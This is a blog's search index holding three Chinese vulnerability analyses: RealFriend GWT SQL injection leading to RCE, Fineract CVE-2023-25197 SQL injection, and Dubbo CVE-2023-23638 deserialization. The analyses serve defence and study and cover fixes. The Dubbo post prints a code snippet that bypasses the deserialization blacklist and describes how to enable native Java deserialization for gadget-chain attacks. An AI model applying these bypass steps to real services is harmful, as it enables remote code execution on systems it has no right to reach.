<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>瑞友天翼应用虚拟化系统远程代码执行漏洞复现与分析</title>
      <link href="/posts/4669a499.html"/>
      <url>/posts/4669a499.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>核心由SQL注入引起的RCE，在没思考SQL注入之前，单看漏洞描述（远程代码执行），前后对比新旧版本看了老半天也没发现修改的哪处代码有代码执行，后面通过一些通报预警描述的由于SQL注入引起的才明白过来，算是分析走的坑吧。还是记录分析过程，文章偏向过程分析的思路和思考。(由于poc暂未公开，测试poc以打码处理，针对分析的漏洞点仅存在于漏洞版本内，最新版7.0.3不收影响)</p><h1 id="0x01、应用描述"><a href="#0x01、应用描述" class="headerlink" title="0x01、应用描述"></a>0x01、应用描述</h1><p>瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。操作终端无需再安装应用程序，通过天翼独特的RAP 协议（Remote Application Protocol），即可让用户快速访问服务器上的各类应用软件；天翼RAP 协议只传输鼠标、键盘及屏幕变化的矢量数据，访问仅需3KB&#x2F;s（20kbps）的带宽，用户不再受客户端和连接性能要求的限制，在任何时间、任何地点，利用任何设备、任何网络连接方式，即可高效安全地访问服务器（群）上的应用程序和关键资源。</p><h1 id="0x02、漏洞描述"><a href="#0x02、漏洞描述" class="headerlink" title="0x02、漏洞描述"></a>0x02、漏洞描述</h1><p>瑞友天翼应用虚拟化系统存在远程代码执行漏洞，未经身份认证的远程攻击者可以利用该漏洞在目标系统上执行任意代码。</p><h1 id="0x03、漏洞范围"><a href="#0x03、漏洞范围" class="headerlink" title="0x03、漏洞范围"></a>0x03、漏洞范围</h1><p>5.x &lt;&#x3D; 瑞友天翼应用虚拟化系统 &lt;&#x3D; 7.0.2.1</p><h1 id="0x04、环境搭建"><a href="#0x04、环境搭建" class="headerlink" title="0x04、环境搭建"></a>0x04、环境搭建</h1><p>下载的漏洞版本安全性未知，就不贴出来了，安装包是个集成环境，自带了php、mysql环境，下载安装包一键式安装起来就行</p><p><img src="/posts/4669a499/r1.png" title="环境安装"></p><p>默认路径：C:\Program Files (x86)\RealFriend\Rap Server\</p><h1 id="0x05、漏洞复现"><a href="#0x05、漏洞复现" class="headerlink" title="0x05、漏洞复现"></a>0x05、漏洞复现</h1><p><img src="/posts/4669a499/r2.png" title="漏洞复现"><br><img src="/posts/4669a499/r3.png" title="漏洞复现"></p><h1 id="0x06、原理分析"><a href="#0x06、原理分析" class="headerlink" title="0x06、原理分析"></a>0x06、原理分析</h1><p><strong>分析思路踩坑：</strong><br>(记录下分析过程的一些坑点，对分析成长还是会有帮助)<br>系统的目录结构：</p><p><img src="/posts/4669a499/r4.png" title="目录结构"></p><p>其中7版本以上都用了tp框架，根目录下的主要文件都是XGI后缀格式，使用Php编译访问，官网下载的7版本已经解密，互联网下载的6版本还是加密需要zend解密</p><p>查看更新补丁情况</p><p><img src="/posts/4669a499/r5.png" title="补丁更新"></p><p>更改了大部分的文件的部分内容，但大多都是增删代码的操作，看完并未找到修复远程代码的核心代码，也没找到直接触发远程代码执行的漏洞，直到看到有厂商漏洞通报的漏洞描述写的由SQL注入导致的RCE，这才把关注点转移到SQL注入上。（踩坑一）</p><p>在去发现SQL漏洞点的过程中，先是比较了新版本修复的代码，发现未对用户输入的参数之类进行修复过滤，也就是说分析思路从新旧版本的修复代码对比上，无法直接看出漏洞点。（踩坑二）</p><hr><p><strong>正式分析：</strong><br>系统中采用了大量的SQL查询，并且很多地方都没有进行过滤并且参数可控（分析思路：找到SQL执行点，追溯可控变量，根据判断条件构造代码）</p><p>找到存在SQL执行，变量可控的点，示例点：</p><p>一类是直接在类中进行调用，只需要追溯满足调用条件即可，如下：<br><img src="/posts/4669a499/r6.png" title="SQL执行，变量可控"></p><p>一类是在方法中进行调用，需要追溯在哪些类中调用了该方法，并满足调用条件，如下：<br><img src="/posts/4669a499/r7.png" title="SQL执行，变量可控"></p><p>分析以这两类举例分析漏洞点，该系统还有好些点存在SQL注入，能达到同样的效果，就不赘述</p><p>定位到sql注入点（文件:ConsoleExternalUploadApi.XGI）</p><p><img src="/posts/4669a499/r8.png" title="SQL执行，变量可控"></p><p>其中<code>$adminName</code>变量和<code>$adminPwd</code>变量都是由上面<code>$requestObj</code>数组中得来，<code>$requestObj</code>数组由<code>$paramArr</code>数组分割”_”符号循环取值，而<code>$paramArr</code>数组由<code>$initparams</code>变量分割”__”符号进行循环取值</p><p><img src="/posts/4669a499/r9.png" title="变量可控"></p><p><code>$initparams</code>数组由用户传参传递进来</p><p><img src="/posts/4669a499/r10.png" title="用户传参"></p><p>理逻辑就是：例如<code>$initparams=&quot;a_1__b_2__c_3&quot;</code>，则<code>$paramArr</code>数组读取分割”__”符号，取值则为<code>$paramArr[0]=a_1</code>，<code>$paramArr[1]=b_2</code>，<code>$paramArr[2]=c_3</code>，其中<code>$requestObj</code>由<code>$paramArr</code>数组变量分割”_“进行循环取值，则<code>$requestObj[&#39;a&#39;]=1</code>，<code>$requestObj[&#39;b&#39;]=2</code>这个逻辑。</p><p><code>$initparams</code>变量知道构造格式了，接着看触发sql执行前面需要满足的其他条件</p><p><img src="/posts/4669a499/r11.png" title="其他条件"></p><p>断点是需要满足的条件：</p><ul><li><code>key</code>、<code>sign</code>和<code>initparams</code>存在且不能为空</li><li><code>$keyVal</code>必须存在且不为空，通过<code>getfarminfo( $key )</code>获取</li></ul><p><img src="/posts/4669a499/r12.png" title="getfarminfo"></p><p>其中<code>key</code>为查询<code>farm</code>表中是否存在名为<code>key</code>变量值对应数据库的值，意思<code>key</code>变量必须为数据库中存在的<code>name</code>值，取对应的数据库值给<code>$keyVal</code>变量</p><p><img src="/posts/4669a499/r13.png" title="getfarminfo"><br><img src="/posts/4669a499/r14.png" title="getfarminfo"></p><ul><li><code>$initparams.$keyVal</code>变量拼接的md5值需要等于<code>$sign</code>变量</li></ul><p>上面的条件则为payload参数的必要条件，其中<code>initParams</code>、<code>key</code>、<code>sign</code>的<code>key</code>、<code>sign</code>已经知道了需要构造的数值，剩下<code>initParams</code>变量，只知道构造格式，还不知道需要具体格式构造的字符串，接着看执行sql前对<code>initParams</code>变量的操作</p><p><img src="/posts/4669a499/r15.png" title="initParams"></p><p>需要满足：<code>$initParams=command_xx__user_xx__pwd_xx__serverIdStr_xx</code>，来满足取值</p><p><img src="/posts/4669a499/r16.png" title="满足条件"></p><p>其中需要满足<code>command</code>字段等于（uploadAuthorizeKeyFile|uploadFileToMenu|uploadFileToMenuDo|delAppFile|uploadIcon）这几个值之一。并且<code>user</code>、<code>pwd</code>存在且不为空即可</p><p>接着<code>$adminName</code>和<code>$adminPwd</code>字段存在SQL注入，就能执行sql注入达到rce的目的了</p><p><img src="/posts/4669a499/r17.png" title="SQL注入"></p><p><img src="/posts/4669a499/r18.png" title="SQL注入写入文件"><br><img src="/posts/4669a499/r19.png" title="SQL注入写入文件"></p><p>上述的触发方式每一步payload构造都需要计算<code>sign</code>值，通过<code>$initparams</code>变量和<code>$keyVal</code>拼接再进行md5计算，调试或者跑sqlmap都需要更改脚本添加md5加密操作。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$signCalculate</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$initparams</span>.<span class="variable">$keyVal</span> );</span><br></pre></td></tr></table></figure><p>同文件还有一个触发点（也就是上述中的sql注入调用方法的情况）:<br><img src="/posts/4669a499/r20.png" title="getfarminfo"></p><p>这里的步骤在最开始当<code>initParams</code>、<code>key</code>、<code>sign</code>存在且不为空即可执行到该步骤方法</p><p><img src="/posts/4669a499/r21.png" title="getfarminfo"></p><p>此时的<code>key</code>即调用方法传入的<code>name</code>变量，直接进行sql执行，达到sql注入的目的，就不需要第一种方法中的计算md5、构造<code>$initparams参数</code>等操作</p><p><img src="/posts/4669a499/r22.png" title="执行sql"><br><img src="/posts/4669a499/r23.png" title="sql注入"><br><img src="/posts/4669a499/r24.png" title="sql注入"></p><p>此外提及的执行Sql知道的物理路径：</p><ul><li>默认安装在C:\Program Files (x86)\RealFriend\Rap Server\</li><li>7版本可通过tp框架报错查看路径，默认开启了debug调试</li></ul><p><img src="/posts/4669a499/r25.png" title="sql注入"></p><h1 id="0x07、漏洞修复"><a href="#0x07、漏洞修复" class="headerlink" title="0x07、漏洞修复"></a>0x07、漏洞修复</h1><p>官方已经推出更新补丁升级至7.0.3.1<br><a href="http://soft.realor.cn:88/Gwt7.0.3.1.exe">http://soft.realor.cn:88/Gwt7.0.3.1.exe</a></p><p>(从代码层面没看出来做了什么代码安全过滤)</p><h1 id="0x08、参考链接"><a href="#0x08、参考链接" class="headerlink" title="0x08、参考链接"></a>0x08、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/ZZYWISRS7D1YqJE9S3h7bw">https://mp.weixin.qq.com/s/ZZYWISRS7D1YqJE9S3h7bw</a><br><a href="http://www.realor.cn/product/xiazaishiyong/">http://www.realor.cn/product/xiazaishiyong/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fineract-SQL注入漏洞(CVE-2023-25197)原理分析</title>
      <link href="/posts/4669a496.html"/>
      <url>/posts/4669a496.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>Fineract-SQL注入漏洞(CVE-2023-25197)原理分析，还有个编号CVE-2023-25196是一起的sql注入的漏洞，但编号CVE-2023-25196在官方提出的补丁即1.8.3版本中仅修复了个获取时间的方式，未找到sql注入的修复的情况，重要修复在1.8.4版本中修复的。</p><h1 id="0x01、Fineract描述"><a href="#0x01、Fineract描述" class="headerlink" title="0x01、Fineract描述"></a>0x01、Fineract描述</h1><p>Apache Fineract 是一个开源的系统，用于核心银行系统平台化建设。为创业者、金融机构和服务提供商提供了一个可靠、健壮的、可负担得起的金融服务解决方案。</p><h1 id="0x02、漏洞描述"><a href="#0x02、漏洞描述" class="headerlink" title="0x02、漏洞描述"></a>0x02、漏洞描述</h1><p>该项目受影响版本存在SQL注入漏洞,由于SQLInjectionValidator.java中对于单引号等特殊元素处理不当，具备登录权限的攻击者可在处理分页时通过控制sortOrder、orderBy参数进行SQL注入。</p><h1 id="0x03、漏洞范围"><a href="#0x03、漏洞范围" class="headerlink" title="0x03、漏洞范围"></a>0x03、漏洞范围</h1><p>1.4 &lt;&#x3D; Apache Fineract版本 &lt;&#x3D; 1.8.3</p><h1 id="0x04、环境搭建"><a href="#0x04、环境搭建" class="headerlink" title="0x04、环境搭建"></a>0x04、环境搭建</h1><p>下载漏洞版本环境：（本文下载版本1.8.3）<br><a href="https://github.com/apache/fineract/">https://github.com/apache/fineract/</a></p><p>运行前提需要安装mysql&#x2F;MariaDB数据库，默认运行端口3306，如果使用本地运行则需要确认数据库的连接用户密码是root&#x2F;mysql，否则会构建报错</p><p>本地运行：<br><img src="/posts/4669a496/f20.png" title="本地运行"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">./gradlew createDB -PdbName=fineract_tenants</span><br><span class="line">./gradlew createDB -PdbName=fineract_default</span><br><span class="line">./gradlew bootRun</span><br></pre></td></tr></table></figure><p>出现<code> :fineract-provider:bootRun</code>则运行正常</p><p><img src="/posts/4669a496/f21.png" title="本地运行"></p><h1 id="0x05、漏洞复现"><a href="#0x05、漏洞复现" class="headerlink" title="0x05、漏洞复现"></a>0x05、漏洞复现</h1><p><img src="/posts/4669a496/f1.png" title="漏洞复现"><br><img src="/posts/4669a496/f2.png" title="漏洞复现"></p><h1 id="0x06、原理分析"><a href="#0x06、原理分析" class="headerlink" title="0x06、原理分析"></a>0x06、原理分析</h1><p>分析前提：</p><p>该漏洞需要身份认证通过的前提（漏洞比较鸡肋的原因），对请求体中添加<code>Authorization</code>认证字段才能访问后续的接口</p><p><img src="/posts/4669a496/f19.png" title="认证前提"></p><p>正式分析：</p><p>预警通报显示漏洞版本存在sql注入，查看修复版本对漏洞点的修复<br>核心修复在PaginationParameters.java文件，对构造方法中的<code>orderBy</code>、<code>sortOrder</code>字段添加了输入校验</p><p><img src="/posts/4669a496/f3.png" title="问题文件"></p><p>新增了输入校验，遍历存在特殊字符则抛出错误</p><p><img src="/posts/4669a496/f4.png" title="问题文件"><br><img src="/posts/4669a496/f5.png" title="问题文件"></p><p>核心就在哪些接口对<code>orderBy</code>、<code>sortOrder</code>字段进行了sql语句调用</p><p><code>PaginationParameters</code>本类中通过<code>getter</code>对<code>orderBy</code>、<code>sortOrder</code>字段进行获取，通过<code>orderBySql</code>和<code>paginationSql</code>方法对sql语句进行符加<code>orderBy</code>、<code>sortOrder</code>字段</p><p><img src="/posts/4669a496/f6.png" title="获取字段"><br><img src="/posts/4669a496/f16.png" title="获取字段"></p><p>接着看<code>PaginationParameters</code>类的实例化，通过<code>instance</code>方法对类进行实例化，意思调用该类的<code>orderBy</code>、<code>sortOrder</code>字段，则会通过调用该类的<code>instance</code>方法进行实例化</p><p><img src="/posts/4669a496/f7.png" title="实例化"></p><p>查看该类的调用情况，其中有5个类进行了调用</p><p><img src="/posts/4669a496/f8.png" title="调用情况"></p><p>查看每个类中的调用情况，这些类的调用流程大体上差不多，通过访问的路径进行获取参数字段，然后实例化<code>PaginationParameters</code>类</p><p><img src="/posts/4669a496/f9.png" title="获取参数字段"></p><p>有些类会对<code>paged</code>参数进行判断，然后进入不同的方法，但核心都会调用到自身xxx类的xxxReadPlatformService接口中调用retrievexxx方法</p><p><img src="/posts/4669a496/f10.png" title="page参数"></p><p>查看retrievexxx方法对<code>PaginationParameters</code>类的处理，找到对应类实现xxxReadPlatformService接口的类，以<code>AuditsApiResource</code>类为例</p><p><img src="/posts/4669a496/f13.png" title="AuditsApiResource"><br><img src="/posts/4669a496/f11.png" title="实现接口类"></p><p>找到对应调用接口的<code>retrievePaginatedAuditEntries</code>方法</p><p><img src="/posts/4669a496/f12.png" title="处理sql方法"></p><p>其中<code>paginationParametersDataValidator.validateParameterValues</code>方法会对<code>orderBy</code>、<code>sortOrder</code>字段进行白名单校验，如果<code>orderBy</code>、<code>sortOrder</code>字段不是白名单列表中支持的参数，则会抛出错误</p><p><img src="/posts/4669a496/f14.png" title="白名单校验"></p><p>此类存在白名单校验的方法均无法实现sql注入，因此需要找到调用方法中不存在白名单校验的类</p><p>找到其中调用<code>PaginationParameters</code>实例化的类<code>RecurringDepositAccountsApiResource</code>（搜索按字母排序这个也是排在最后，前面的类每个都看了都进行了白名单检测，一度怀疑漏洞点触发位置的排查思路是否不正确，直到看完最后一个类的最后一个调用方法才看到没有进行检测，不得不说这些挖漏洞的作者确实心细）</p><p><img src="/posts/4669a496/f15.png" title="RecurringDepositAccountsApiResource"></p><p>其中当<code>paged</code>参数为<code>false</code>或者不存在时，调用<code>this.depositAccountReadPlatformService.retrieveAll</code>方法</p><p><img src="/posts/4669a496/f17.png" title="retrieveAll"></p><p>该方法直接调用<code>paginationSql</code>方法追加了<code>orderBy/sortOrder</code>字段，未进行白名单校验，直接执行了sql语句</p><p><img src="/posts/4669a496/f16.png" title="获取字段"><br><img src="/posts/4669a496/f18.png" title="未进行白名单校验"></p><p>因此该类当<code>paged</code>参数不存在或者为<code>false</code>时，即存在sql注入漏洞</p><p><img src="/posts/4669a496/f1.png" title="漏洞复现"><br><img src="/posts/4669a496/f2.png" title="漏洞复现"></p><p>分析没有直接给出poc，网上还没有公开poc，但原理调用比较简单，看完自己调试也大体能找到漏洞位置，就暂不直接贴出来了，主要是学习分析思路。</p><h1 id="0x07、漏洞修复"><a href="#0x07、漏洞修复" class="headerlink" title="0x07、漏洞修复"></a>0x07、漏洞修复</h1><p>官方以推出修复版本1.8.4<br>核心修复在PaginationParameters.java文件，对构造方法中的orderBy、sortOrder字段添加了输入校验</p><p><img src="/posts/4669a496/f3.png" title="问题文件"></p><p>新增了输入校验，遍历存在特殊字符则抛出错误</p><p><img src="/posts/4669a496/f4.png" title="问题文件"><br><img src="/posts/4669a496/f5.png" title="问题文件"></p><p>该修复方式直接从根源上初始调用实例化该类时就对orderBy、sortOrder字段进行了校验过滤</p><h1 id="0x08、参考链接"><a href="#0x08、参考链接" class="headerlink" title="0x08、参考链接"></a>0x08、参考链接</h1><p><a href="https://www.oscs1024.com/hd/MPS-2023-3839">https://www.oscs1024.com/hd/MPS-2023-3839</a><br><a href="https://github.com/apache/fineract/">https://github.com/apache/fineract/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo反序列化漏洞(CVE-2023-23638)复现与分析</title>
      <link href="/posts/3e6cbad8.html"/>
      <url>/posts/3e6cbad8.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>Dubbo反序列化漏洞(CVE-2023-23638)复现与分析</p><h1 id="0x01、Dubbo描述"><a href="#0x01、Dubbo描述" class="headerlink" title="0x01、Dubbo描述"></a>0x01、Dubbo描述</h1><p>Apache Dubbo 是一款高性能、轻量级的开源 Java 服务框架。Apache Dubbo提供了六大核心能力：面向接口代理的高性能RPC调用，智能容错和负载均衡，服务自动注册和发现，高度可扩展能力，运行期流量调度，可视化的服务治理与运维。</p><h1 id="0x02、漏洞描述"><a href="#0x02、漏洞描述" class="headerlink" title="0x02、漏洞描述"></a>0x02、漏洞描述</h1><p>Dubbo 泛化调用时由于反序列化检查机制实现存在缺陷，可访问目标服务的攻击者可能在服务提供方上执行恶意代码。利用此漏洞需知道接口全限定名、方法名、入参及返参类型。攻击者成功利用此漏洞可造成远程代码执行。</p><h1 id="0x03、漏洞范围"><a href="#0x03、漏洞范围" class="headerlink" title="0x03、漏洞范围"></a>0x03、漏洞范围</h1><p>Apache Dubbo 2.7.x &lt;&#x3D; 2.7.21<br>Apache Dubbo 3.0.x &lt;&#x3D; 3.0.13<br>Apache Dubbo 3.1.x &lt;&#x3D; 3.1.5</p><h1 id="0x04、环境搭建"><a href="#0x04、环境搭建" class="headerlink" title="0x04、环境搭建"></a>0x04、环境搭建</h1><p>环境需要zookeeper+dubbo</p><p>zookeeper搭建：<br>zookeeper官方下载：<a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a><br>需要修改config，主要是添加dataDir&#x2F;dataLogDir数据和日志路径</p><p><img src="/posts/3e6cbad8/d4.png" title="修改config"></p><p>直接运行bin目录下的zkServer.cmd即可</p><p><img src="/posts/3e6cbad8/d7.png" title="修改config"></p><p>dubbo环境搭建：<br>可参考<a href="https://blog.csdn.net/m0_67401660/article/details/126721394">dubbo环境搭建</a></p><p>或者使用已经搭建好的均可：<br><a href="https://github.com/lz2y/DubboPOC/">https://github.com/lz2y/DubboPOC/</a><br><a href="https://github.com/X1r0z/CVE-2023-23638">https://github.com/X1r0z/CVE-2023-23638</a></p><p>本环境使用<a href="https://github.com/lz2y/DubboPOC/">https://github.com/lz2y/DubboPOC/</a>  导入的漏洞环境</p><p><img src="/posts/3e6cbad8/d5.png" title="dubbo漏洞版本"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;dubbo&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">2.7</span><span class="number">.21</span>&lt;/version&gt;</span><br></pre></td></tr></table></figure><p>最后更新下maven即可</p><p><img src="/posts/3e6cbad8/d6.png" title="更新maven"></p><h1 id="0x05、漏洞复现"><a href="#0x05、漏洞复现" class="headerlink" title="0x05、漏洞复现"></a>0x05、漏洞复现</h1><p>可选择jdbcRowSetImpl链加载ldap进行复现</p><p><img src="/posts/3e6cbad8/d3.png" title="ldap"></p><p>触发位置</p><p><img src="/posts/3e6cbad8/d1.png" title="触发位置"></p><p><img src="/posts/3e6cbad8/d2.png" title="漏洞复现"></p><h1 id="0x06、原理分析"><a href="#0x06、原理分析" class="headerlink" title="0x06、原理分析"></a>0x06、原理分析</h1><h2 id="泛型调用"><a href="#泛型调用" class="headerlink" title="泛型调用"></a>泛型调用</h2><p>dubbo提供程序接口公开的任意方法的泛型调用，通过解码流数据后由<code>GenericFilter</code>类进行处理</p><p><img src="/posts/3e6cbad8/d8.png" title="GenericFilter"></p><p>其中要求:</p><ul><li><code>inv</code>对象的方法名等于<code>$invoke</code>或者<code>$invokeAsync</code></li><li><code>inv</code>参数不能为空，参数数量为3个参数并且要求不继承<code>GenericService</code>类</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((inv.getMethodName().equals($INVOKE) || inv.getMethodName().equals($INVOKE_ASYNC))</span><br><span class="line">                &amp;&amp; inv.getArguments() != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; inv.getArguments().length == <span class="number">3</span></span><br><span class="line">                &amp;&amp; !GenericService.class.isAssignableFrom(invoker.getInterface())) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ((String) inv.getArguments()[<span class="number">0</span>]).trim();</span><br><span class="line">            String[] types = (String[]) inv.getArguments()[<span class="number">1</span>];</span><br><span class="line">            Object[] args = (Object[]) inv.getArguments()[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>获取<code>inv</code>其中的<code>name</code>、<code>types</code>、<code>args</code>属性对应<code>inv</code>对象的三个参数(方法名、方法类型、方法参数)</p><p>接着调用<code>ReflectUtils.findMethodByMethodSignature</code>方法判断改对象是否是系统服务提供的方法，不为则抛出异常，这也是实现的<strong>必要条件之一</strong></p><p><img src="/posts/3e6cbad8/d9.png" title="ReflectUtils.findMethodByMethodSignature"></p><p>因此payload中会在流中写入服务提供端的调用方法</p><p><img src="/posts/3e6cbad8/d10.png" title="调用方法"></p><p>接下来根据<code>generic</code>属性进行不同的序列化操作</p><p><img src="/posts/3e6cbad8/d11.png" title="generic属性"></p><h2 id="方式一：SerializeClassChecker绕过黑名单执行setter"><a href="#方式一：SerializeClassChecker绕过黑名单执行setter" class="headerlink" title="方式一：SerializeClassChecker绕过黑名单执行setter"></a>方式一：SerializeClassChecker绕过黑名单执行setter</h2><p>其中如果<code>generic</code>属性为<code>raw.return</code>，则会调用<code>PojoUtils.realize</code>方法进行反序列化操作</p><p>该方法会循环数组对象调用<code>realize</code>方法，进而调用<code>realize0</code>方法</p><p><img src="/posts/3e6cbad8/d12.png" title="realize"><br><img src="/posts/3e6cbad8/d13.png" title="realize0"></p><p>realize0方法中判断生成的pojo对象，其中有判断pojo对象为泛型的情况</p><p><code>pojo</code>对象为泛型，则会从<code>pojo</code>对象中获取<code>key</code>为<code>class</code>的值作为将实例化出来的类名，并经过<code>SerializeClassChecker.getInstance().validateClass</code>检查该类名是否在序列化类检查器的黑名单中</p><p><img src="/posts/3e6cbad8/d14.png" title="realize0"></p><p>默认情况序列化检查<code>OPEN_CHECK_CLASS</code>是开启的，因此会对类名进行黑名单检查，会循环遍历类名前缀是否匹配黑名单进行抛出异常</p><p><img src="/posts/3e6cbad8/d15.png" title="黑名单检查"><br><img src="/posts/3e6cbad8/d16.png" title="黑名单检查"><br><img src="/posts/3e6cbad8/d23.png" title="黑名单检查"></p><p>因此关闭序列化检查也是实现的<strong>必要条件之一</strong>，解决方法可重新传递一个<code>Instance</code>变量值去替换重新生成<code>new SerializeClassChecker()</code>序列化检查器，让<code>Instance</code>不为空，即在调用<code>getInstance</code>方法时则不会<code>new SerializeClassChecker()</code>，从而规避黑名单检查</p><p><img src="/posts/3e6cbad8/d17.png" title="黑名单检查"><br><img src="/posts/3e6cbad8/d18.png" title="黑名单检查"></p><p>替换方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashmap.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.dubbo.common.utils.SerializeClassChecker&quot;</span>);</span><br><span class="line">hashmap.put(<span class="string">&quot;CLASS_DESERIALIZE_BLOCKED_SET&quot;</span>, <span class="keyword">new</span> <span class="title class_">ConcurrentHashSet</span>&lt;&gt;());</span><br><span class="line">HashMap&lt;String, Object&gt; scc = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">scc.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.dubbo.common.utils.SerializeClassChecker&quot;</span>);</span><br><span class="line">scc.put(<span class="string">&quot;INSTANCE&quot;</span>, hashmap);</span><br></pre></td></tr></table></figure><p>回到泛型处理来，规避检查后，将<code>className</code>通过反射获取的类返回给<code>type</code></p><p><img src="/posts/3e6cbad8/d19.png" title="获取类"></p><p>然后对type进行类型判断进入不同的处理方法，依次判断type是否是枚举类、是否是map类的子类&#x2F;是否是Object类型、是否是接口类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.isEnum()) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Map.class.isAssignableFrom(type) || type == Object.class) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (type.isInterface()) &#123;</span><br></pre></td></tr></table></figure><p>如果都不是，则直接实例化type对象，通过读取map中的键值对，通过<code>getSetterMethod</code>方法获取到type对象中存在set前缀开头的key名称的方法</p><p>如果找不到type类对象中存在set前缀开头的key名称的方法，则可以设置任意field</p><p><img src="/posts/3e6cbad8/d21.png" title="获取field"></p><p>如果能找到set前缀开头的key名称的方法，则直接通过反射获取该方法并执行</p><p><img src="/posts/3e6cbad8/d20.png" title="反射执行"></p><p><img src="/posts/3e6cbad8/d22.png" title="反射执行"></p><p>除上述执行方法外，还有一类，通过开启NATIVE_JAVA执行方式，GenericFilter#invoke方法中</p><h2 id="方式二：java-native绕过执行原生反序列化"><a href="#方式二：java-native绕过执行原生反序列化" class="headerlink" title="方式二：java_native绕过执行原生反序列化"></a>方式二：java_native绕过执行原生反序列化</h2><p>箭头为上述的方法，红框为使用native java方法</p><p><img src="/posts/3e6cbad8/d24.png" title="native-java"></p><p>还有一类使用Native java方式，模式情况是禁止的，该方法是直接使用原生反序列化直接反序列化数据，<code>ENABLE_NATIVE_JAVA_GENERIC_SERIALIZE</code>值默认为false</p><p><img src="/posts/3e6cbad8/d25.png" title="native-java"></p><p>若开启native-java执行方式，则直接调用反序列化</p><p><img src="/posts/3e6cbad8/d26.png" title="native-java"></p><p>其中<code>configuration</code>是从系统环境配置读取的信息</p><p><img src="/posts/3e6cbad8/d27.png" title="configuration"></p><p>下面是<code>configuration</code>读取系统配置的调用信息</p><p><img src="/posts/3e6cbad8/d28.png" title="getBoolean"><br><img src="/posts/3e6cbad8/d29.png" title="convert"><br><img src="/posts/3e6cbad8/d30.png" title="getProperty"><br><img src="/posts/3e6cbad8/d31.png" title="getProperty"></p><p>现在需要利用一个类，能对<code>Property</code>系统环境配置里的<code>dubbo.security.serialize.generic.native-java-enable</code>属性设置为<code>true</code></p><p>通过<code>ConfigUtils</code>类存在<code>setProperties</code>方法，可利用上述的泛型引用反射执行<code>setter</code>方法去赋值<code>properties</code>属性，将<code>dubbo.security.serialize.generic.native-java-enable</code>属性设置为<code>true</code></p><p><img src="/posts/3e6cbad8/d32.png" title="ConfigUtils"><br><img src="/posts/3e6cbad8/d33.png" title="Properties"></p><p>可通过<code>Properties</code>类的<code>setProperty</code>方法将<code>dubbo.security.serialize.generic.native-java-enable</code>&#x3D;<code>true</code>放入hashmap</p><p><img src="/posts/3e6cbad8/d34.png" title="Properties"></p><p>再将<code>Properties</code>类对象传递入<code>ConfigUtils</code>的<code>setProperties</code>方法去实现修改配置属性</p><p><img src="/posts/3e6cbad8/d35.png" title="Properties"></p><p>修改完属性就能传递payload通过java-native去执行反序列化攻击。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>方式一:</strong></p><ul><li>设置<code>generic</code>属性为<code>raw.return</code>。</li><li>重新传递一个<code>Instance</code>变量值去替换重新生成<code>new SerializeClassChecker()</code>序列化检查器规避黑名单</li><li>通过setter调用类方法，通过反射执行方法。</li></ul><p><strong>方式二:</strong></p><ul><li>设置<code>generic</code>属性为<code>raw.return</code>。</li><li>将<code>Properties</code>类对象传递入<code>ConfigUtils</code>的<code>setProperties</code>方法去实现修改配置<code>dubbo.security.serialize.generic.native-java-enable</code>属性为<code>true</code></li><li>通过Java-native执行原生反序列化</li></ul><p><strong>效果区别：</strong><br>方式一只能使用通过setter方法调用实现的类方法，只有利用链通过setter方法触发的才能实现，例如jdbcRowSetImpl链，通过setter和反射设置setDataSourceName为jndi加载地址，再通过setter和反射执行setAutoCommit方法实现jndi调用。</p><p>方式二可使用任意方法的序列化，兼容利用链更多，能使用更多的利用链如存在cc组件，可使用cc链进行攻击。</p><h1 id="0x07、漏洞修复"><a href="#0x07、漏洞修复" class="headerlink" title="0x07、漏洞修复"></a>0x07、漏洞修复</h1><p>目前官方已发布Apache Dubbo安全版本，建议尽快升级至安全版本：</p><p>Apache Dubbo 